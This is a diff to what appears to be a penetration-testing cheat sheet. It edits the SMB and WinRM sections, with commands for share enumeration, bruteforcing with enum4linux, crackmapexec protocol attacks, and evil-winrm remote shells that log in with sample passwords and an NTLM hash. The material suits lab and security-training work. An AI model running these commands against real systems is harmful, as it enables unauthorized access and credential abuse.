@@ -506,25 +506,15 @@ getdompwinfo
 getdominfo
 ```
 
-Syntax: `smbclient -L //server/[service] -U <USERNAME>`
-Syntax: `smbclient -L -N //server/[service] -U <USERNAME>` for no password.
 
-
+Use `smbclient` if you have username and password. This will list the shares.
 ```
-smbclient -L //$TG/ -U '<USERNAME>'
-smbclient -L //$TG/<SHARE> -U '<USERNAME>'
-smbclient -I //$TG/ -U '<USERNAME>' -P '<PASSWORD>'  
+smbclient -L $TG -U '<USERNAME>'
 ```
 
-The `smbclient` command will give a `smb: \>` shell interface, if the authentication was successful.
-
+The `smbclient` command will give a `smb: \>` shell interface pointed to the share, if the authentication was successful.
 ```
-evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
-```
-
-
-```
-evil-winrm -i 10.10.196.249 -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'
+smbclient //$TG/<SHARE-NAME> -U <USERNAME>
 ```
 
 
@@ -576,7 +566,14 @@ $ smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -Hh 10.1.3.30 -x 'net group "Domain
 Can check for null sessions.
 ```
 enum4linux -a $TG
+enum4linux -a -u admin -p password1 $TG
 ```
+
+Also supports share enumeration (via bruteforcing).
+```
+enum4linux -s <FULL_PATH_OF_SHARES> -u <USERNAME> -p <PASSWORD>  $TG 
+```
+
 
 
 ### HTTPS (Port 443)
@@ -615,6 +612,7 @@ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:10.10.10.1:3389
 
 ### WinRM (Port 5985 / 5986 over SSL)
 
+
 You can use `crackmapexec` to attack {rdp,ssh,mssql,ftp,ldap,winrm,smb} protocols.
 
 ```
@@ -625,6 +623,8 @@ crackmapexec winrm -u <USERNAME> -p <PASSWORD> -x "systeminfo" --port 5985  $TG
 Use `evil-winrm.rb` for shell
 ```
 evil-winrm -i 10.5.27.227 -u administrator -p tinkerbell
+evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+evil-winrm -i 10.10.196.249 -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'
 ```
 
 ```
